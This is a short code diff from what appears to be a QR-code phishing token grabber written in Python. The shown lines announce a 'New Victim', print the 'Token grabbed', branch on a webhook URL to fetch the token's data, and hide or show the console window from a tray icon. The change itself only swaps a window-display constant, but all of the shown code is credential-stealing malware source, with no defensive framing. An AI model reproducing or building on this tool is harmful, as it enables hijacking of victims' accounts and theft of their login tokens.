@@ -95,7 +95,7 @@ def main(webhook_url) -> None:
     main.driver.quit()
     pystray_icon.icon.notify("The traget scanned the QR-code sucessfuly.", 'New Victim !')
     time.sleep(3)
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
     Write.Print(f"\n\n[?] Token grabbed: {token}", Colors.rainbow)
     if webhook_url != None:
         Write.Print("\n\n[!] Fetching token data...", Colors.red_to_purple)
@@ -135,7 +135,7 @@ if __name__ == "__main__":
     def pystray_icon():
         def window_state(icon, item):
             if str(item) == 'Show':
-                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 1)
+                return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 5)
             elif str(item) == 'Hide':
                 return ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
             elif str(item) == 'Quit':
